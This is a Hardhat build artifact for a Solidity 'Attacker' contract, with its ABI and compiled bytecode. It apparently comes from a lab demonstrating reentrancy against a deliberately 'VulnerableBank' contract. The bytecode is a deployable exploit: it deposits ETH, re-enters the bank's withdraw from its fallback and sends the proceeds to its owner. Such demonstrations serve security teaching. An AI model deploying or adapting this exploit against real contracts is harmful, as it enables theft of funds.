{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableBankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "AttackStarted",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "stolenAmount",
          "type": "uint256"
        }
      ],
      "name": "AttackSucceeded",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "ReceivedETH",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "MAX_REENTRY",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBankBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reentryCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vulnerableBank",
      "outputs": [
        {
          "internalType": "contract VulnerableBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105af3803806105af83398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6105138061009c6000396000f3fe60806040526004361061008a5760003560e01c80637b83b50b116100595780637b83b50b1461020357806388193565146102225780638da5cb5b146102385780639e5faafc14610270578063a1c9aee1146102785761016c565b806312065fe0146101a15780633ccfd60b146101c357806353b38169146101d857806354cdb21b146101ee5761016c565b3661016c57604080513481524760208201527fc9a1ad483a7ca637eebe6b9ef2ee23277c04b79253311e94353321f808e267c691015b60405180910390a1600380549060006100d8836104b6565b919050555060026003541080156100fd57506002546000546001600160a01b03163110155b1561016a57600054600254604051632e1a7d4d60e01b81526001600160a01b0390921691632e1a7d4d916101379160040190815260200190565b600060405180830381600087803b15801561015157600080fd5b505af1158015610165573d6000803e3d6000fd5b505050505b005b604080513481524760208201527fc9a1ad483a7ca637eebe6b9ef2ee23277c04b79253311e94353321f808e267c691016100c0565b3480156101ad57600080fd5b50475b6040519081526020015b60405180910390f35b3480156101cf57600080fd5b5061016a610298565b3480156101e457600080fd5b506101b060035481565b3480156101fa57600080fd5b506101b0600281565b34801561020f57600080fd5b506000546001600160a01b0316316101b0565b34801561022e57600080fd5b506101b060025481565b34801561024457600080fd5b50600154610258906001600160a01b031681565b6040516001600160a01b0390911681526020016101ba565b61016a610333565b34801561028457600080fd5b50600054610258906001600160a01b031681565b6001546001600160a01b031633146102f75760405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e20776974686472617700000000000000000060448201526064015b60405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610330573d6000803e3d6000fd5b50565b600034116103785760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b60448201526064016102ee565b34600281905560006003556040519081527f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a9060200160405180910390a160008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561040457600080fd5b505af1158015610418573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b81523460048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b15801561046357600080fd5b505af1158015610477573d6000803e3d6000fd5b505050507f87bdb4bdd764b85bcc2ac8c46ee07b3880e73be114fd9ab5c4dc42f45dd6cb16476040516104ac91815260200190565b60405180910390a1565b6000600182016104d657634e487b7160e01b600052601160045260246000fd5b506001019056fea264697066735822122033f6f8648d97513864a50e35b162139a5942f1b14bb293bc09e7ae74ccff8b4264736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}